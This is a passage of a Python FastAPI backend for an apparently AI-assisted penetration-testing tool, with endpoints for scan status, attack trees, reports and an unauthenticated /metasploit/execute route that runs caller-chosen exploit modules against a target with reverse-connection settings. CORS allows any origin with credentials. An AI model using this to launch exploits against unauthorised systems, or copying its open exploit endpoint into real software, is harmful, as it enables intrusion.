            "scan_id": scan_id, "status": p["status"], "current_tool": p["current_tool"],
            "progress": p["progress"], "results": p["results"],
            "tactical_decisions": p.get("tactical_decisions", []),
            "final_tactical": p.get("final_tactical"),
            "ai_analysis": p.get("ai_analysis"), "exploits": p.get("exploits", []),
            "attack_tree": p.get("attack_tree")
        }
    
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
    if scan:
        return {
            "scan_id": scan_id, "status": scan["status"], "current_tool": None,
            "progress": 100, "results": scan.get("results", {}),
            "tactical_decisions": scan.get("tactical_decisions", []),
            "final_tactical": scan.get("final_tactical"),
            "ai_analysis": scan.get("ai_analysis"), "exploits": scan.get("exploits", []),
            "attack_tree": scan.get("attack_tree")
        }
    raise HTTPException(status_code=404, detail="Scan not found")

@api_router.get("/scan/{scan_id}/tree")
async def get_attack_tree(scan_id: str):
    if scan_id in attack_trees:
        return attack_trees[scan_id]
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
    if scan and "attack_tree" in scan:
        return scan["attack_tree"]
    raise HTTPException(status_code=404, detail="Tree not found")

@api_router.put("/scan/{scan_id}/tree/node/{node_id}")
async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
    if scan_id not in attack_trees:
        scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
        if scan:
            attack_trees[scan_id] = scan["attack_tree"]
        else:
            raise HTTPException(status_code=404, detail="Tree not found")
    
    tree = attack_trees[scan_id]
    if node_id in tree["nodes"]:
        tree["nodes"][node_id]["status"] = update.status
        await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree}})
    return {"message": "Updated", "status": update.status}

@api_router.post("/metasploit/execute")
async def execute_metasploit(exploit: ExploitExecute):
    return await run_metasploit(exploit.module, exploit.target_host, exploit.target_port, exploit.options, exploit.lhost, exploit.lport)

@api_router.get("/metasploit/modules")
async def get_metasploit_modules(query: str = "", category: str = ""):
    modules = METASPLOIT_MODULES
    if category:
        modules = [m for m in modules if m["category"] == category]
    if query:
        modules = [m for m in modules if query.lower() in m["name"].lower() or query.lower() in m["desc"].lower()]
    return {"modules": modules}

@api_router.get("/scan/history")
async def get_scan_history():
    return await db.scans.find({}, {"_id": 0, "id": 1, "target": 1, "status": 1, "phases": 1, "created_at": 1}).sort("created_at", -1).to_list(100)

@api_router.get("/scan/{scan_id}/report")
async def get_scan_report(scan_id: str):
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
    if not scan:
        raise HTTPException(status_code=404, detail="Not found")
    return {"report": scan}

@api_router.delete("/scan/{scan_id}")
async def delete_scan(scan_id: str):
    await db.scans.delete_one({"id": scan_id})
    scan_progress.pop(scan_id, None)
    attack_trees.pop(scan_id, None)
    return {"message": "Deleted"}

app.include_router(api_router)
app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','), allow_methods=["*"], allow_headers=["*"])

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
